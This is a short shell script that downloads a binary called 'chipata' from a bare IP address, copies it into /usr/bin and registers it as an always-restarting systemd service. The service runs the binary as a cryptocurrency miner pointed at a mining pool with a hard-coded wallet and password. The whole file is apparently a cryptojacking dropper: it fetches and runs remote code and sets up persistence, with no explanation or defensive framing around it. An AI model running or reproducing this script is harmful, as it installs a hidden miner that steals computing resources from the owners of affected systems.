#!/bin/sh
wget http://104.248.127.206/chipata
chmod 777 chipata
cp chipata /usr/bin 
touch  /etc/systemd/system/chipata.service
chmod 666 /etc/systemd/system/chipata.service
cat << EOF > /etc/systemd/system/chipata.service 
 
[Unit] 
 
Description=chipata 
 
After=network.target 
 
StartLimitIntervalSec=0 
 
[Service] 
 
Type=simple 
 
Restart=always 
 
RestartSec=1 
 
ExecStart=/usr/bin/chipata --disable-gpu --algorithm randomepic --pool epic.ca.hashrate.to:4000 --wallet 499f420d52285ab12dda1be9e4d516a7b41e4baace0a3fc54f73db3dd418f3ac --password wabeiyoyatrs --log-file log.txt
 
[Install] 
 
WantedBy=multi-user.target 
 
EOF
chmod 600 /etc/systemd/system/chipata.service
systemctl enable chipata
systemctl daemon-reload
systemctl restart chipata
